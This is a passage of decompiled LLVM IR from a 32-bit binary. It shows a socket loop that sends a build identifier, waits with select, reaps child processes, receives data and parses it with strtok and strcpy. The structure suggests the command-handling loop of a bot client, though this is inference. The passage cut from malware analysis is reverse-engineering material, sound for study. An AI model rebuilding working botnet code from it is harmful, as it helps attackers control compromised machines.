  %v0_8055ee8 = load i32, i32* @global_var_807d3cc.53, align 4
  store i32 %v0_8055ee8, i32* @edi, align 4
  %v0_8055eee = call i32 @getBuild()
  store i32 %v0_8055eee, i32* %eax.global-to-local, align 4
  %v0_8055ef3 = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8055ef3, i32* %edx.global-to-local, align 4
  %v0_8055ef9 = load i32, i32* @esp, align 4
  %v0_8055efc = load i32, i32* @ebx, align 4
  %v2_8055efc = add i32 %v0_8055ef9, -8
  %v3_8055efc = inttoptr i32 %v2_8055efc to i32*
  store i32 %v0_8055efc, i32* %v3_8055efc, align 4
  %v0_8055efd = load i32, i32* @esi, align 4
  %v2_8055efd = add i32 %v0_8055ef9, -12
  %v3_8055efd = inttoptr i32 %v2_8055efd to i32*
  store i32 %v0_8055efd, i32* %v3_8055efd, align 4
  %v0_8055efe = load i32, i32* @edi, align 4
  %v2_8055efe = add i32 %v0_8055ef9, -16
  %v3_8055efe = inttoptr i32 %v2_8055efe to i32*
  store i32 %v0_8055efe, i32* %v3_8055efe, align 4
  %v2_8055eff = add i32 %v0_8055ef9, -20
  %v3_8055eff = inttoptr i32 %v2_8055eff to i32*
  store i32 %v0_8055eee, i32* %v3_8055eff, align 4
  %v1_8055f00 = add i32 %v0_8055ef9, -24
  %v2_8055f00 = inttoptr i32 %v1_8055f00 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8068ba7.55 to i32), i32* %v2_8055f00, align 4
  %v1_8055f05 = add i32 %v0_8055ef9, -28
  %v2_8055f05 = inttoptr i32 %v1_8055f05 to i32*
  store i32 ptrtoint ([48 x i8]* @global_var_806c74c.609 to i32), i32* %v2_8055f05, align 4
  %v0_8055f0a = load i32, i32* %edx.global-to-local, align 4
  %v2_8055f0a = add i32 %v0_8055ef9, -32
  %v3_8055f0a = inttoptr i32 %v2_8055f0a to i32*
  store i32 %v0_8055f0a, i32* %v3_8055f0a, align 4
  %v0_8055f0b = load i32, i32* %stack_var_-6656, align 4
  %v2_8055f0b = call i32 @Send(i32 %v0_8055f0b, i32 8)
  store i32 %v2_8055f0b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055f15.outer.outer

dec_label_pc_8055f15.outer.outer:                 ; preds = %dec_label_pc_80562dd, %dec_label_pc_80562fc, %dec_label_pc_8055ed7
  %stack_var_-6628.1.ph.ph111 = phi i8* [ %stack_var_-6628.0, %dec_label_pc_8055ed7 ], [ %stack_var_-6628.329, %dec_label_pc_80562fc ], [ %stack_var_-6628.2.ph, %dec_label_pc_80562dd ]
  %stack_var_-40.1.ph.ph = phi i32 [ %stack_var_-40.0, %dec_label_pc_8055ed7 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_80562fc ], [ %stack_var_-40.3.lcssa, %dec_label_pc_80562dd ]
  br label %dec_label_pc_8055f15.outer

dec_label_pc_8055f15.outer:                       ; preds = %dec_label_pc_8055f15.outer.outer, %dec_label_pc_80560e8
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.3.lcssa, %dec_label_pc_80560e8 ], [ %stack_var_-40.1.ph.ph, %dec_label_pc_8055f15.outer.outer ]
  br label %dec_label_pc_8055f15

dec_label_pc_8055f15:                             ; preds = %dec_label_pc_8055f15.outer, %dec_label_pc_805609a
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.3.lcssa, %dec_label_pc_805609a ], [ %stack_var_-40.1.ph, %dec_label_pc_8055f15.outer ]
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8055f1f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8055f26 = call i8* @_memset(i8* %tmp104, i32 0, i32 32)
  %v6_8055f26 = ptrtoint i8* %v5_8055f26 to i32
  %v0_8055f2e = load i32, i32* @global_var_807d3d0.29, align 16
  %v2_8055f35 = udiv i32 %v0_8055f2e, 32
  store i32 %v2_8055f35, i32* %edx.global-to-local, align 4
  %v1_8055f3d = urem i32 %v0_8055f2e, 32
  store i32 %v1_8055f3d, i32* %eax.global-to-local, align 4
  %v0_8055f40 = load i32, i32* @ebp, align 4
  %v2_8055f40 = mul nuw nsw i32 %v2_8055f35, 4
  %v3_8055f40 = add nsw i32 %v2_8055f40, -452
  %v4_8055f40 = add i32 %v3_8055f40, %v0_8055f40
  %v5_8055f40 = inttoptr i32 %v4_8055f40 to i32*
  %v6_8055f40 = load i32, i32* %v5_8055f40, align 4
  %v9_8055f40 = shl i32 1, %v1_8055f3d
  %v12_8055f40 = or i32 %v6_8055f40, %v9_8055f40
  store i32 %v12_8055f40, i32* %v5_8055f40, align 4
  store i32 1200, i32* %stack_var_-332, align 4
  %v0_8055f5c = load i32, i32* @global_var_807d3d0.29, align 16
  %v1_8055f61 = add i32 %v0_8055f5c, 1
  store i32 %v1_8055f61, i32* %edx.global-to-local, align 4
  %v0_8055f64 = load i32, i32* @esp, align 4
  %v2_8055f6d = add i32 %v0_8055f64, -16
  %v3_8055f6d = inttoptr i32 %v2_8055f6d to i32*
  store i32 %v2_8055f67, i32* %v3_8055f6d, align 4
  %v1_8055f6e = add i32 %v0_8055f64, -20
  %v2_8055f6e = inttoptr i32 %v1_8055f6e to i32*
  store i32 0, i32* %v2_8055f6e, align 4
  %v1_8055f70 = add i32 %v0_8055f64, -24
  %v2_8055f70 = inttoptr i32 %v1_8055f70 to i32*
  store i32 0, i32* %v2_8055f70, align 4
  store i32 %v2_8055f1f, i32* %eax.global-to-local, align 4
  %v2_8055f78 = add i32 %v0_8055f64, -28
  %v3_8055f78 = inttoptr i32 %v2_8055f78 to i32*
  store i32 %v2_8055f1f, i32* %v3_8055f78, align 4
  %v0_8055f79 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055f79 = add i32 %v0_8055f64, -32
  %v3_8055f79 = inttoptr i32 %v2_8055f79 to i32*
  store i32 %v0_8055f79, i32* %v3_8055f79, align 4
  %v0_8055f7a = load i32, i32* %stack_var_-332, align 4
  %v5_8055f7a = call i32 @__libc_select(i32 %v0_8055f7a, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055f7a, i32* %eax.global-to-local, align 4
  %v0_8055f7f = load i32, i32* @esp, align 4
  %v1_8055f7f = add i32 %v0_8055f7f, 32
  %tmp106 = icmp slt i32 %v5_8055f7a, 1
  br i1 %tmp106, label %dec_label_pc_8055ed7, label %dec_label_pc_805608c.preheader

dec_label_pc_805608c.preheader:                   ; preds = %dec_label_pc_8055f15
  %v0_805608c139 = load i32, i32* @global_var_80748f4.31, align 4
  store i32 %v0_805608c139, i32* %eax.global-to-local, align 4
  %v10_8056091141 = icmp eq i32 %v0_805608c139, 0
  br i1 %v10_8056091141, label %dec_label_pc_805609a, label %dec_label_pc_8055f96

dec_label_pc_8055f96:                             ; preds = %dec_label_pc_805608c.preheader, %dec_label_pc_8056089
  %storemerge7149 = phi i32 [ %.pre, %dec_label_pc_8056089 ], [ 0, %dec_label_pc_805608c.preheader ]
  %stack_var_-40.3148 = phi i32 [ %stack_var_-40.2, %dec_label_pc_8056089 ], [ %stack_var_-40.1, %dec_label_pc_805608c.preheader ]
  %v0_8055fa8147 = phi i32 [ %v0_80560c444, %dec_label_pc_8056089 ], [ %v1_8055f7f, %dec_label_pc_805608c.preheader ]
  %v2_8055f99 = mul i32 %storemerge7149, 4
  store i32 %v2_8055f99, i32* %edx.global-to-local, align 4
  %v0_8055f9e = load i32, i32* @global_var_807e574.32, align 4
  %v2_8055fa3 = add i32 %v0_8055f9e, %v2_8055f99
  store i32 %v2_8055fa3, i32* %eax.global-to-local, align 4
  %v1_8055fa6 = inttoptr i32 %v2_8055fa3 to i32*
  %v2_8055fa6 = load i32, i32* %v1_8055fa6, align 4
  store i32 %v2_8055fa6, i32* %eax.global-to-local, align 4
  %v1_8055fab = add i32 %v0_8055fa8147, -8
  %v2_8055fab = inttoptr i32 %v1_8055fab to i32*
  store i32 1, i32* %v2_8055fab, align 4
  %v1_8055fad = add i32 %v0_8055fa8147, -12
  %v2_8055fad = inttoptr i32 %v1_8055fad to i32*
  store i32 0, i32* %v2_8055fad, align 4
  %v0_8055faf = load i32, i32* %eax.global-to-local, align 4
  %v2_8055faf = add i32 %v0_8055fa8147, -16
  %v3_8055faf = inttoptr i32 %v2_8055faf to i32*
  store i32 %v0_8055faf, i32* %v3_8055faf, align 4
  %v4_8055fb0 = call i32 @waitpid(i32 %storemerge7149, i32 %v6_8055f26, i32 %v2_8055f1f, i32 %stack_var_-40.3148)
  store i32 %v4_8055fb0, i32* %eax.global-to-local, align 4
  %v0_8055fb5 = load i32, i32* @esp, align 4
  %tmp107 = icmp slt i32 %v4_8055fb0, 1
  %.pre = add i32 %storemerge7149, 1
  br i1 %tmp107, label %dec_label_pc_8056089, label %dec_label_pc_8055fc0

dec_label_pc_8055fc0:                             ; preds = %dec_label_pc_8055f96
  %v0_8055ff3124 = load i32, i32* @global_var_80748f4.31, align 4
  %v10_8055ff8125 = icmp ult i32 %.pre, %v0_8055ff3124
  %v2_8055fcc126 = mul i32 %.pre, 4
  store i32 %v2_8055fcc126, i32* %edx.global-to-local, align 4
  %v0_8055fd1127 = load i32, i32* @global_var_807e574.32, align 4
  %v2_8055fd6128 = add i32 %v0_8055fd1127, %v2_8055fcc126
  store i32 %v2_8055fd6128, i32* %eax.global-to-local, align 4
  %v1_8055fd9129 = add i32 %v2_8055fd6128, -4
  br i1 %v10_8055ff8125, label %dec_label_pc_8055fc9, label %dec_label_pc_8055ffd

dec_label_pc_8055fc9:                             ; preds = %dec_label_pc_8055fc0, %dec_label_pc_8055fc9
  %v1_8055fd9133 = phi i32 [ %v1_8055fd9, %dec_label_pc_8055fc9 ], [ %v1_8055fd9129, %dec_label_pc_8055fc0 ]
  %v2_8055fd6132 = phi i32 [ %v2_8055fd6, %dec_label_pc_8055fc9 ], [ %v2_8055fd6128, %dec_label_pc_8055fc0 ]
  %v2_8055fcc131 = phi i32 [ %v2_8055fcc, %dec_label_pc_8055fc9 ], [ %v2_8055fcc126, %dec_label_pc_8055fc0 ]
  %storemerge9130 = phi i32 [ %v4_8055ff0, %dec_label_pc_8055fc9 ], [ %.pre, %dec_label_pc_8055fc0 ]
  store i32 %v1_8055fd9133, i32* @ecx, align 4
  store i32 %v2_8055fcc131, i32* %edx.global-to-local, align 4
  store i32 %v2_8055fd6132, i32* %eax.global-to-local, align 4
  %v1_8055fec = inttoptr i32 %v2_8055fd6132 to i32*
  %v2_8055fec = load i32, i32* %v1_8055fec, align 4
  %v2_8055fee = inttoptr i32 %v1_8055fd9133 to i32*
  store i32 %v2_8055fec, i32* %v2_8055fee, align 4
  %v4_8055ff0 = add i32 %storemerge9130, 1
  %v0_8055ff3 = load i32, i32* @global_var_80748f4.31, align 4
  %v10_8055ff8 = icmp ult i32 %v4_8055ff0, %v0_8055ff3
  %v2_8055fcc = mul i32 %v4_8055ff0, 4
  store i32 %v2_8055fcc, i32* %edx.global-to-local, align 4
  %v0_8055fd1 = load i32, i32* @global_var_807e574.32, align 4
  %v2_8055fd6 = add i32 %v0_8055fd1, %v2_8055fcc
  store i32 %v2_8055fd6, i32* %eax.global-to-local, align 4
  %v1_8055fd9 = add i32 %v2_8055fd6, -4
  br i1 %v10_8055ff8, label %dec_label_pc_8055fc9, label %dec_label_pc_8055ffd

dec_label_pc_8055ffd:                             ; preds = %dec_label_pc_8055fc9, %dec_label_pc_8055fc0
  %storemerge9.lcssa = phi i32 [ %.pre, %dec_label_pc_8055fc0 ], [ %v4_8055ff0, %dec_label_pc_8055fc9 ]
  %v1_8055fd9.lcssa = phi i32 [ %v1_8055fd9129, %dec_label_pc_8055fc0 ], [ %v1_8055fd9, %dec_label_pc_8055fc9 ]
  %v1_8056010 = inttoptr i32 %v1_8055fd9.lcssa to i32*
  store i32 0, i32* %v1_8056010, align 4
  %v0_8056016 = load i32, i32* @global_var_80748f4.31, align 4
  %v1_805601b = add i32 %v0_8056016, -1
  store i32 %v1_805601b, i32* @global_var_80748f4.31, align 4
  %v2_8056026 = mul i32 %v1_805601b, 4
  %v1_8056029 = add i32 %v2_8056026, 4
  store i32 %v1_8056029, i32* %eax.global-to-local, align 4
  %v0_805602c = load i32, i32* @esp, align 4
  %v2_805602f = add i32 %v0_805602c, -16
  %v3_805602f = inttoptr i32 %v2_805602f to i32*
  store i32 %v1_8056029, i32* %v3_805602f, align 4
  %v1_8056030 = call i32 @malloc(i32 %storemerge9.lcssa)
  %v0_8056035 = load i32, i32* @esp, align 4
  %v1_8056035 = add i32 %v0_8056035, 16
  %v0_8056066135 = load i32, i32* @global_var_80748f4.31, align 4
  store i32 %v0_8056066135, i32* %eax.global-to-local, align 4
  %v10_805606b136 = icmp eq i32 %v0_8056066135, 0
  br i1 %v10_805606b136, label %dec_label_pc_8056070, label %dec_label_pc_8056044

dec_label_pc_8056044:                             ; preds = %dec_label_pc_8055ffd, %dec_label_pc_8056044
  %storemerge8137 = phi i32 [ %v4_8056063, %dec_label_pc_8056044 ], [ 0, %dec_label_pc_8055ffd ]
  %v2_8056047 = mul i32 %storemerge8137, 4
  %v5_805604c = add i32 %v2_8056047, %v1_8056030
  store i32 %v5_805604c, i32* @ecx, align 4
  store i32 %v2_8056047, i32* %edx.global-to-local, align 4
  %v0_8056057 = load i32, i32* @global_var_807e574.32, align 4
  %v2_805605c = add i32 %v0_8056057, %v2_8056047
  store i32 %v2_805605c, i32* %eax.global-to-local, align 4
  %v1_805605f = inttoptr i32 %v2_805605c to i32*
  %v2_805605f = load i32, i32* %v1_805605f, align 4
  %v2_8056061 = inttoptr i32 %v5_805604c to i32*
  store i32 %v2_805605f, i32* %v2_8056061, align 4
  %v4_8056063 = add i32 %storemerge8137, 1
  %v0_8056066 = load i32, i32* @global_var_80748f4.31, align 4
  store i32 %v0_8056066, i32* %eax.global-to-local, align 4
  %v10_805606b = icmp ult i32 %v4_8056063, %v0_8056066
  br i1 %v10_805606b, label %dec_label_pc_8056044, label %dec_label_pc_8056066.dec_label_pc_8056070_crit_edge

dec_label_pc_8056066.dec_label_pc_8056070_crit_edge: ; preds = %dec_label_pc_8056044
  %v0_8056075.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056070

dec_label_pc_8056070:                             ; preds = %dec_label_pc_8055ffd, %dec_label_pc_8056066.dec_label_pc_8056070_crit_edge
  %v0_8056075 = phi i32 [ %v0_8056075.pre, %dec_label_pc_8056066.dec_label_pc_8056070_crit_edge ], [ %v1_8056035, %dec_label_pc_8055ffd ]
  %storemerge8.lcssa = phi i32 [ %v4_8056063, %dec_label_pc_8056066.dec_label_pc_8056070_crit_edge ], [ 0, %dec_label_pc_8055ffd ]
  %v0_8056070 = load i32, i32* @global_var_807e574.32, align 4
  store i32 %v0_8056070, i32* %eax.global-to-local, align 4
  %v2_8056078 = add i32 %v0_8056075, -16
  %v3_8056078 = inttoptr i32 %v2_8056078 to i32*
  store i32 %v0_8056070, i32* %v3_8056078, align 4
  %v1_8056079 = call i32 @free(i32 %storemerge8.lcssa)
  %v0_805607e = load i32, i32* @esp, align 4
  store i32 %v1_8056030, i32* %eax.global-to-local, align 4
  store i32 %v1_8056030, i32* @global_var_807e574.32, align 4
  br label %dec_label_pc_8056089

dec_label_pc_8056089:                             ; preds = %dec_label_pc_8055f96, %dec_label_pc_8056070
  %v0_80560c444.in = phi i32 [ %v0_805607e, %dec_label_pc_8056070 ], [ %v0_8055fb5, %dec_label_pc_8055f96 ]
  %stack_var_-40.2 = phi i32 [ %v1_8056030, %dec_label_pc_8056070 ], [ %stack_var_-40.3148, %dec_label_pc_8055f96 ]
  %v0_80560c444 = add i32 %v0_80560c444.in, 16
  %v0_805608c = load i32, i32* @global_var_80748f4.31, align 4
  store i32 %v0_805608c, i32* %eax.global-to-local, align 4
  %v10_8056091 = icmp ult i32 %.pre, %v0_805608c
  br i1 %v10_8056091, label %dec_label_pc_8055f96, label %dec_label_pc_805609a

dec_label_pc_805609a:                             ; preds = %dec_label_pc_805608c.preheader, %dec_label_pc_8056089
  %v0_8055fa8.lcssa = phi i32 [ %v1_8055f7f, %dec_label_pc_805608c.preheader ], [ %v0_80560c444, %dec_label_pc_8056089 ]
  %stack_var_-40.3.lcssa = phi i32 [ %stack_var_-40.1, %dec_label_pc_805608c.preheader ], [ %stack_var_-40.2, %dec_label_pc_8056089 ]
  %storemerge7.lcssa = phi i32 [ 0, %dec_label_pc_805608c.preheader ], [ %.pre, %dec_label_pc_8056089 ]
  %v0_805609a = load i32, i32* @global_var_807d3d0.29, align 16
  %v1_80560a1 = urem i32 %v0_805609a, 32
  store i32 %v1_80560a1, i32* %edx.global-to-local, align 4
  %v2_80560a9 = udiv i32 %v0_805609a, 32
  store i32 %v2_80560a9, i32* %eax.global-to-local, align 4
  %v0_80560ac = load i32, i32* @ebp, align 4
  %v2_80560ac = mul nuw nsw i32 %v2_80560a9, 4
  %v3_80560ac = add nsw i32 %v2_80560ac, -452
  %v4_80560ac = add i32 %v3_80560ac, %v0_80560ac
  %v5_80560ac = inttoptr i32 %v4_80560ac to i32*
  %v6_80560ac = load i32, i32* %v5_80560ac, align 4
  %v9_80560ac = shl i32 1, %v1_80560a1
  %v10_80560ac = and i32 %v6_80560ac, %v9_80560ac
  %v11_80560ac = icmp ne i32 %v10_80560ac, 0
  %v1_80560b4 = zext i1 %v11_80560ac to i32
  %v3_80560b4 = and i32 %v2_80560a9, 134217472
  %v4_80560b4 = or i32 %v1_80560b4, %v3_80560b4
  store i32 %v4_80560b4, i32* %eax.global-to-local, align 4
  %v4_80560b7 = icmp eq i1 %v11_80560ac, false
  br i1 %v4_80560b7, label %dec_label_pc_8055f15, label %dec_label_pc_80560bf

dec_label_pc_80560bf:                             ; preds = %dec_label_pc_805609a
  store i32 %v0_805609a, i32* %eax.global-to-local, align 4
  %v1_80560c4 = add i32 %v0_8055fa8.lcssa, -4
  %v2_80560c4 = inttoptr i32 %v1_80560c4 to i32*
  store i32 0, i32* %v2_80560c4, align 4
  %v1_80560c6 = add i32 %v0_8055fa8.lcssa, -8
  %v2_80560c6 = inttoptr i32 %v1_80560c6 to i32*
  store i32 4096, i32* %v2_80560c6, align 4
  store i32 %v2_80560cb, i32* %edx.global-to-local, align 4
  %v2_80560d1 = add i32 %v0_8055fa8.lcssa, -12
  %v3_80560d1 = inttoptr i32 %v2_80560d1 to i32*
  store i32 %v2_80560cb, i32* %v3_80560d1, align 4
  %v0_80560d2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80560d2 = add i32 %v0_8055fa8.lcssa, -16
  %v3_80560d2 = inttoptr i32 %v2_80560d2 to i32*
  store i32 %v0_80560d2, i32* %v3_80560d2, align 4
  %v4_80560d3 = call i32 @recv(i32 %storemerge7.lcssa, i32 %v6_8055f26, i32 %v2_8055f1f, i32 %stack_var_-40.3.lcssa)
  store i32 %v4_80560d3, i32* %eax.global-to-local, align 4
  %tmp108 = icmp slt i32 %v4_80560d3, 1
  br i1 %tmp108, label %dec_label_pc_8055ed7, label %dec_label_pc_80560e8

dec_label_pc_80560e8:                             ; preds = %dec_label_pc_80560bf
  %v0_80560eb = load i32, i32* @ebp, align 4
  %v2_80560eb = add i32 %v4_80560d3, -6596
  %v3_80560eb = add i32 %v2_80560eb, %v0_80560eb
  %v4_80560eb = inttoptr i32 %v3_80560eb to i8*
  store i8 0, i8* %v4_80560eb, align 1
  %v0_80560f3 = load i32, i32* @esp, align 4
  %v1_80560f6 = add i32 %v0_80560f3, -12
  %v2_80560f6 = inttoptr i32 %v1_80560f6 to i32*
  store i32 ptrtoint (i32* @global_var_806c77c.610 to i32), i32* %v2_80560f6, align 4
  store i32 %v2_80560cb, i32* @eax, align 4
  %v2_8056101 = add i32 %v0_80560f3, -16
  %v3_8056101 = inttoptr i32 %v2_8056101 to i32*
  store i32 %v2_80560cb, i32* %v3_8056101, align 4
  %v1_8056102 = load i32, i32* %stack_var_-24, align 4
  %v2_8056102 = call i32 @__GI_strtok(i32 %v4_80560d3, i32 %v1_8056102)
  store i32 %v2_8056102, i32* %eax.global-to-local, align 4
  %v0_8056107 = load i32, i32* @esp, align 4
  %v5_805610a = inttoptr i32 %v2_8056102 to i8*
  store i8* %v5_805610a, i8** %stack_var_-32, align 4
  %v5_80562f222 = icmp eq i32 %v2_8056102, 0
  br i1 %v5_80562f222, label %dec_label_pc_8055f15.outer, label %dec_label_pc_80562fc

dec_label_pc_8056112:                             ; preds = %dec_label_pc_80562fc
  %v6_8056112 = add i32 %v5_8056112.in, 12
  %v7_8056112 = inttoptr i32 %v6_8056112 to i32*
  store i32 %v4_80562fc, i32* %v7_8056112, align 4
  %v0_8056115 = call i32 @filter()
  %v3_805611d = load i8*, i8** %stack_var_-32, align 4
  %v4_805611d = ptrtoint i8* %v3_805611d to i32
  store i32 %v4_805611d, i32* %eax.global-to-local, align 4
  %v2_8056120 = load i8, i8* %v3_805611d, align 1
  %v3_8056120 = zext i8 %v2_8056120 to i32
  %v5_8056120 = and i32 %v4_805611d, -256
  %v6_8056120 = or i32 %v3_8056120, %v5_8056120
  store i32 %v6_8056120, i32* %eax.global-to-local, align 4
  %v10_8056122 = icmp eq i8 %v2_8056120, 58
  %v1_8056124 = icmp eq i1 %v10_8056122, false
  br i1 %v1_8056124, label %dec_label_pc_805619b, label %dec_label_pc_8056132

dec_label_pc_805612f:                             ; preds = %dec_label_pc_8056157
  %v4_805612f = add i32 %storemerge6, 1
  br label %dec_label_pc_8056132

dec_label_pc_8056132:                             ; preds = %dec_label_pc_8056112, %dec_label_pc_805612f
  %storemerge6 = phi i32 [ %v4_805612f, %dec_label_pc_805612f ], [ 0, %dec_label_pc_8056112 ]
  store i32 %storemerge6, i32* %edx.global-to-local, align 4
  store i32 %v5_8056120, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v3_805614c = call i32 @_strlen(i8* %v3_805611d)
  store i32 %v3_805614c, i32* %eax.global-to-local, align 4
  %v0_8056153 = load i32, i32* %edx.global-to-local, align 4
  %v7_8056153 = icmp ult i32 %v0_8056153, %v3_805614c
  %v1_8056155 = icmp eq i1 %v7_8056153, false
  %.pre66 = add i32 %storemerge6, %v4_805611d
  br i1 %v1_8056155, label %dec_label_pc_8056132.dec_label_pc_8056163_crit_edge, label %dec_label_pc_8056157

dec_label_pc_8056132.dec_label_pc_8056163_crit_edge: ; preds = %dec_label_pc_8056132
  %.pre73 = inttoptr i32 %.pre66 to i8*
  br label %dec_label_pc_8056163

dec_label_pc_8056157:                             ; preds = %dec_label_pc_8056132
  store i32 %.pre66, i32* %eax.global-to-local, align 4
  %v1_805615d = inttoptr i32 %.pre66 to i8*
  %v2_805615d = load i8, i8* %v1_805615d, align 1
  %v3_805615d = zext i8 %v2_805615d to i32
  %v5_805615d = and i32 %.pre66, -256
  %v6_805615d = or i32 %v3_805615d, %v5_805615d
  store i32 %v6_805615d, i32* %eax.global-to-local, align 4
  %v7_805615f = icmp eq i8 %v2_805615d, 32
  %v1_8056161 = icmp eq i1 %v7_805615f, false
  br i1 %v1_8056161, label %dec_label_pc_805612f, label %dec_label_pc_8056163

dec_label_pc_8056163:                             ; preds = %dec_label_pc_8056157, %dec_label_pc_8056132.dec_label_pc_8056163_crit_edge
  %v1_8056169.pre-phi = phi i8* [ %.pre73, %dec_label_pc_8056132.dec_label_pc_8056163_crit_edge ], [ %v1_805615d, %dec_label_pc_8056157 ]
  store i8 0, i8* %v1_8056169.pre-phi, align 1
  %v3_805616c = load i8*, i8** %stack_var_-32, align 4
  %v4_805616c = ptrtoint i8* %v3_805616c to i32
  %v1_805616f = add i32 %v4_805616c, 1
  %v0_8056170 = load i32, i32* @esp, align 4
  %v2_8056173 = add i32 %v0_8056170, -12
  %v3_8056173 = inttoptr i32 %v2_8056173 to i32*
  store i32 %v1_805616f, i32* %v3_8056173, align 4
  store i32 %v2_805619b, i32* @eax, align 4
  %v2_805617a = add i32 %v0_8056170, -16
  %v3_805617a = inttoptr i32 %v2_805617a to i32*
  store i32 %v2_805619b, i32* %v3_805617a, align 4
  %v4_805617b = call i32 @strcpy(i8* %v3_805611d, i32 %stack_var_-6624.0.lcssa)
  %v0_8056180 = load i32, i32* @esp, align 4
  %v4_8056186 = load i8*, i8** %stack_var_-32, align 4
  %v5_8056186 = ptrtoint i8* %v4_8056186 to i32
  %v6_8056186 = add i32 %storemerge6, 1
  %v1_8056189 = add i32 %v6_8056186, %v5_8056186
  store i32 %v1_8056189, i32* @eax, align 4
  %v2_805618d = add i32 %v0_8056180, 4
  %v3_805618d = inttoptr i32 %v2_805618d to i32*
  store i32 %v1_8056189, i32* %v3_805618d, align 4
  %v3_805618e = load i8*, i8** %stack_var_-32, align 4
  %v4_805618e = ptrtoint i8* %v3_805618e to i32
  %v7_805618e = inttoptr i32 %v0_8056180 to i32*
  store i32 %v4_805618e, i32* %v7_805618e, align 4
  %v4_8056191 = call i32 @strcpy(i8* %v3_805611d, i32 %stack_var_-6624.0.lcssa)
  store i32 %v4_8056191, i32* %eax.global-to-local, align 4
  %v3_80561b5.pre.pre = load i8*, i8** %stack_var_-32, align 4
  br label %dec_label_pc_80561b2.preheader

dec_label_pc_805619b:                             ; preds = %dec_label_pc_8056112
  store i32 %v2_805619b, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-2508, align 4
  br label %dec_label_pc_80561b2.preheader

dec_label_pc_80561b2.preheader:                   ; preds = %dec_label_pc_8056163, %dec_label_pc_805619b
  %v3_80561b5.pre = phi i8* [ %v3_80561b5.pre.pre, %dec_label_pc_8056163 ], [ %v3_805611d, %dec_label_pc_805619b ]
  %stack_var_-6628.2.ph = phi i8* [ %v3_805611d, %dec_label_pc_8056163 ], [ %stack_var_-6628.329, %dec_label_pc_805619b ]
  %v4_80561b5 = ptrtoint i8* %v3_80561b5.pre to i32
  %v1_80561c3 = and i32 %v4_80561b5, -256
  br label %dec_label_pc_80561b2

dec_label_pc_80561af:                             ; preds = %dec_label_pc_80561d7
  %v4_80561af = add i32 %storemerge5, 1
  br label %dec_label_pc_80561b2

dec_label_pc_80561b2:                             ; preds = %dec_label_pc_80561b2.preheader, %dec_label_pc_80561af
  %storemerge5 = phi i32 [ %v4_80561af, %dec_label_pc_80561af ], [ 0, %dec_label_pc_80561b2.preheader ]
  store i32 %storemerge5, i32* %edx.global-to-local, align 4
  store i32 %v1_80561c3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_80561b5, i32* @edi, align 4
  %v3_80561cc = call i32 @_strlen(i8* %v3_80561b5.pre)
  store i32 %v3_80561cc, i32* %eax.global-to-local, align 4
  %v0_80561d3 = load i32, i32* %edx.global-to-local, align 4
  %v7_80561d3 = icmp ult i32 %v0_80561d3, %v3_80561cc
  %v1_80561d5 = icmp eq i1 %v7_80561d3, false
  %.pre58 = add i32 %storemerge5, %v4_80561b5
  br i1 %v1_80561d5, label %dec_label_pc_80561b2.dec_label_pc_80561e3_crit_edge, label %dec_label_pc_80561d7

dec_label_pc_80561b2.dec_label_pc_80561e3_crit_edge: ; preds = %dec_label_pc_80561b2
  %.pre65 = inttoptr i32 %.pre58 to i8*
  br label %dec_label_pc_80561e3

dec_label_pc_80561d7:                             ; preds = %dec_label_pc_80561b2
  store i32 %.pre58, i32* %eax.global-to-local, align 4
  %v1_80561dd = inttoptr i32 %.pre58 to i8*
  %v2_80561dd = load i8, i8* %v1_80561dd, align 1
  %v3_80561dd = zext i8 %v2_80561dd to i32
  %v5_80561dd = and i32 %.pre58, -256
  %v6_80561dd = or i32 %v3_80561dd, %v5_80561dd
  store i32 %v6_80561dd, i32* %eax.global-to-local, align 4
  %v7_80561df = icmp eq i8 %v2_80561dd, 32
  %v1_80561e1 = icmp eq i1 %v7_80561df, false
  br i1 %v1_80561e1, label %dec_label_pc_80561af, label %dec_label_pc_80561e3

dec_label_pc_80561e3:                             ; preds = %dec_label_pc_80561d7, %dec_label_pc_80561b2.dec_label_pc_80561e3_crit_edge
  %v1_80561e9.pre-phi = phi i8* [ %.pre65, %dec_label_pc_80561b2.dec_label_pc_80561e3_crit_edge ], [ %v1_80561dd, %dec_label_pc_80561d7 ]
  store i8 0, i8* %v1_80561e9.pre-phi, align 1
  %v0_80561ec = load i32, i32* @esp, align 4
  %v3_80561ef = load i8*, i8** %stack_var_-32, align 4
  %v4_80561ef = ptrtoint i8* %v3_80561ef to i32
  %v6_80561ef = add i32 %v0_80561ec, -12
  %v7_80561ef = inttoptr i32 %v6_80561ef to i32*
  store i32 %v4_80561ef, i32* %v7_80561ef, align 4
  store i32 %v2_80561f2, i32* @eax, align 4
  %v2_80561f8 = add i32 %v0_80561ec, -16
  %v3_80561f8 = inttoptr i32 %v2_80561f8 to i32*
  store i32 %v2_80561f2, i32* %v3_80561f8, align 4
  %v3_80561f9 = ptrtoint i8* %stack_var_-6628.2.ph to i32
  %v5_80561f9 = call i32 @strcpy(i8* %v3_80561b5.pre, i32 %v3_80561f9)
  %v0_80561fe = load i32, i32* @esp, align 4
  %v4_8056204 = load i8*, i8** %stack_var_-32, align 4
  %v5_8056204 = ptrtoint i8* %v4_8056204 to i32
  %v6_8056204 = add i32 %storemerge5, 1
  %v1_8056207 = add i32 %v6_8056204, %v5_8056204
  store i32 %v1_8056207, i32* @eax, align 4
  %v2_805620b = add i32 %v0_80561fe, 4
  %v3_805620b = inttoptr i32 %v2_805620b to i32*
  store i32 %v1_8056207, i32* %v3_805620b, align 4
  %v3_805620c = load i8*, i8** %stack_var_-32, align 4
  %v4_805620c = ptrtoint i8* %v3_805620c to i32
  %v7_805620c = inttoptr i32 %v0_80561fe to i32*
  store i32 %v4_805620c, i32* %v7_805620c, align 4
